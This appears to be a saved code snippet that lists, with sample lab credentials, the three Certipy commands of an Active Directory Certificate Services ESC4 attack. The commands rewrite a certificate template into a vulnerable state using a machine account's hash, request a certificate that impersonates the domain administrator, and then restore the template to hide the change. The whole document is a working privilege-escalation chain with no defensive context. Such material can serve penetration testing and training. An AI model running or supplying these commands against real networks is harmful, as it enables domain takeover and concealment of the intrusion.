---
id: 5285dd6c-e4e2-4f68-9235-144afffdfd6e
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:05.849985+00:00'
updated_at: '2023-04-10T20:25:59.021893+00:00'
---

# Code Snippet 5285dd6c

**Language**: ps1

```ps1
# overwrite the configuration to make it vulnerable to ESC1
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
# request a certificate based on the ESC4 template, just like ESC1.
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
# restore the old configuration
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
```
